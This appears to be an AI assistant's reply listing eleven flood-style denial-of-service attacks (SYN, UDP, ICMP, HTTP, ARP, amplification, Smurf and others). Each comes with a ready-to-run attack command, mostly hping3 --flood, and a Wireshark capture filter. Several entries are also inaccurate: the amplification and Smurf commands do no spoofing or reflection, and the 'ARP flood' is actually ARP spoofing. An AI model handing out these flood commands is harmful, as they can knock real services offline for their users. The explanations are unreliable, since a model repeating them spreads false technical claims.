Sure, let's dive into a detailed breakdown of each type of flood attack, the commands used to perform them, and the Wireshark filters to capture the traffic.

### 1. SYN Flood
**Description:**
A SYN flood attack exploits the TCP handshake process. The attacker sends a succession of SYN requests to a target's system, but never completes the handshake by sending the final ACK. This consumes server resources, making it unresponsive to legitimate traffic.

**Command:**
```bash
hping3 -S -p 80 --flood -V <target_ip>
```
- `hping3`: A command-line tool for network testing.
- `-S`: Send a SYN packet.
- `-p 80`: Specify the target port (HTTP in this case).
- `--flood`: Send packets as fast as possible.
- `-V`: Verbose mode.

**Wireshark Filter:**
```plaintext
tcp.flags.syn == 1
```
This filter captures only the SYN packets, which are the initial packets in the TCP handshake.

### 2. UDP Flood
**Description:**
A UDP flood attack sends a large number of UDP packets to random ports on a remote host. Since UDP is connectionless, the target system will try to process each packet, consuming resources.

**Command:**
```bash
hping3 -2 -p 53 --flood -V <target_ip>
```
- `-2`: Use UDP mode.
- `-p 53`: Specify the target port (DNS in this case).

**Wireshark Filter:**
```plaintext
udp
```
This filter captures all UDP packets.

### 3. ICMP Flood (Ping Flood)
**Description:**
An ICMP flood attack sends a large number of ICMP Echo Request (ping) packets to the target. The target system will respond with ICMP Echo Reply packets, consuming resources.

**Command:**
```bash
hping3 -C 8 --flood -V <target_ip>
```
- `-C 8`: Send an ICMP Echo Request packet.

**Wireshark Filter:**
```plaintext
icmp
```
This filter captures all ICMP packets.

### 4. HTTP Flood
**Description:**
An HTTP flood attack sends a large number of HTTP requests to a web server. This can overwhelm the server, making it unresponsive to legitimate requests.

**Command:**
```bash
ab -n 10000 -c 100 <target_url>
```
- `ab`: ApacheBench, a tool for benchmarking web servers.
- `-n 10000`: Number of requests to perform.
- `-c 100`: Number of multiple requests to make at a time.

**Wireshark Filter:**
```plaintext
http
```
This filter captures all HTTP packets.

### 5. DNS Flood
**Description:**
A DNS flood attack sends a large number of DNS requests to a DNS server. This can overwhelm the server, making it unresponsive to legitimate DNS queries.

**Command:**
```bash
hping3 -2 -p 53 --flood -V <target_ip>
```
- `-p 53`: Specify the target port (DNS).

**Wireshark Filter:**
```plaintext
dns
```
This filter captures all DNS packets.

### 6. SMTP Flood
**Description:**
An SMTP flood attack sends a large number of SMTP requests to an SMTP server. This can overwhelm the server, making it unresponsive to legitimate email traffic.

**Command:**
```bash
hping3 -2 -p 25 --flood -V <target_ip>
```
- `-p 25`: Specify the target port (SMTP).

**Wireshark Filter:**
```plaintext
smtp
```
This filter captures all SMTP packets.

### 7. ARP Flood
**Description:**
An ARP flood attack sends a large number of ARP requests to a network. This can overwhelm the network, making it unresponsive to legitimate ARP requests.

**Command:**
```bash
arpspoof -i <interface> -t <target_ip> <gateway_ip>
```
- `arpspoof`: A tool for ARP spoofing.
- `-i <interface>`: Specify the network interface.
- `-t <target_ip>`: Specify the target IP.
- `<gateway_ip>`: Specify the gateway IP.

**Wireshark Filter:**
```plaintext
arp
```
This filter captures all ARP packets.

### 8. DNS Amplification Attack
**Description:**
A DNS amplification attack sends a large number of DNS requests to a DNS server with a spoofed source IP address. The responses are sent to the spoofed IP, overwhelming the target.

**Command:**
```bash
hping3 -2 -p 53 --flood -V <target_ip>
```
- `-p 53`: Specify the target port (DNS).

**Wireshark Filter:**
```plaintext
dns
```
This filter captures all DNS packets.

### 9. NTP Flood
**Description:**
An NTP flood attack sends a large number of NTP requests to an NTP server. This can overwhelm the server, making it unresponsive to legitimate NTP queries.

**Command:**
```bash
hping3 -2 -p 123 --flood -V <target_ip>
```
- `-p 123`: Specify the target port (NTP).

**Wireshark Filter:**
```plaintext
ntp
```
This filter captures all NTP packets.

### 10. SIP Flood
**Description:**
A SIP flood attack sends a large number of SIP requests to a SIP server. This can overwhelm the server, making it unresponsive to legitimate SIP traffic.

**Command:**
```bash
sipflood -t <target_ip> -p 5060 -c 1000
```
- `sipflood`: A tool for SIP flooding.
- `-t <target_ip>`: Specify the target IP.
- `-p 5060`: Specify the target port (SIP).
- `-c 1000`: Number of concurrent connections.

**Wireshark Filter:**
```plaintext
sip
```
This filter captures all SIP packets.

### 11. Smurf Attack
**Description:**
A Smurf attack sends a large number of ICMP Echo Request packets with a spoofed source IP address to a network. The responses are sent to the spoofed IP, overwhelming the target.

**Command:**
```bash
hping3 -C 8 --flood -V <target_ip>
```
- `-C 8`: Send an ICMP Echo Request packet.

**Wireshark Filter:**
```plaintext
icmp
```
This filter captures all ICMP packets.

Would you like me to explain or break down any of the commands or filters further?
